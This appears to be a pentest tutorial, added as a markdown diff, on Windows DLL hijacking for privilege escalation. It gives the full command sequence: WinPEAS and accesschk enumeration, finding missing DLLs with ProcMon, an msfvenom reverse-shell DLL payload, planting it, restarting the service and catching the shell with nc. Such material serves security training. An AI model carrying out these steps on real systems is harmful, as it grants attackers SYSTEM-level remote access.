@@ -1,0 +1,113 @@
+## 🎯 What Is DLL Hijacking?
+
+When a Windows service or program **searches for a DLL**, it looks in certain folders in a specific order.
+
+If it **can’t find the DLL in the expected path**, it keeps searching — and if **you can place a malicious DLL in one of those locations**, it will get loaded and executed with **the same privileges as the service (e.g., SYSTEM)**.
+
+---
+
+## 🔍 Enumeration (Find Hijackable DLLs)
+
+### 🔧 Tool: WinPEAS.exe
+
+Run `WinPEAS` on the target machine. Look for sections like:
+
+- `Potential DLL Hijacking`
+- `Service Executables Missing DLLs`
+- `Writable Directories in PATH`
+
+<img width="858" height="198" alt="image" src="https://github.com/user-attachments/assets/882de4ce-cf47-4d21-85c2-579e0ddec46a" />
+
+
+*(Example: Found service **`dllsvc`**)*
+
+## ✅ Check If You Can Exploit
+
+### Step 1: Check Service Permissions
+
+```bash
+accesschk.exe /accepteula -quvw user dllsvc
+```
+
+Check for:
+
+- `SERVICE_START`
+- `SERVICE_STOP`
+
+If you have these, you can control the service.
+
+<img width="860" height="217" alt="image" src="https://github.com/user-attachments/assets/88469c21-fe26-4431-9bc1-0f8716bf9d6c" />
+
+
+### **2. Verify Service Control**
+
+```
+sc qc dllsvc
+```
+
+🔹 **If it runs as `LocalSystem` → Perfect!**
+
+Here you can see the `SERVICE_START_NAME` is LocalSystem it means the service runs with **very high privileges**
+
+<img width="863" height="272" alt="image" src="https://github.com/user-attachments/assets/bf2b8b31-e5eb-4169-96c5-30615709a7d1" />
+
+
+### **3. Analyze with Process Monitor**
+
+1. Download Process Monitor (ProcMon) from Microsoft
+2. Run as Administrator
+3. Set filters:
+    - Process Name: **`dllsvc.exe`**
+    - Operation: **`CreateFile`**
+    - Result: **`NAME NOT FOUND`**
+4. Start capturing and run:
+
+```
+net start dllsvc
+```
+
+### **4. Identify Missing DLLs**
+
+In ProcMon, look for:
+
+```
+PATH\NOT\FOUND\example.dll
+```
+
+Note the exact DLL name and search paths.
+
+<img width="889" height="774" alt="image" src="https://github.com/user-attachments/assets/c3d403b0-3c7d-4e7b-9bad-6761b65ea020" />
+
+
+### **5. Create Malicious DLL**
+
+Generate a malicious DLL payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o evil.dll
+```
+
+Rename to match the missing DLL (e.g., **`example.dll`**)
+
+### **6. Plant the DLL**
+
+Copy to a writable location that appears earlier in the DLL search order:
+
+```
+copy evil.dll "C:\Program Files\VulnerableService\missing.dll"
+```
+
+### **7. Trigger the Exploit**
+
+```
+net stop dllsvc
+net start dllsvc
+```
+
+### **8. Catch the Shell**
+
+```
+nc -nvlp 4444
+```
+
+💥 You should receive a reverse shell with the service's privileges!
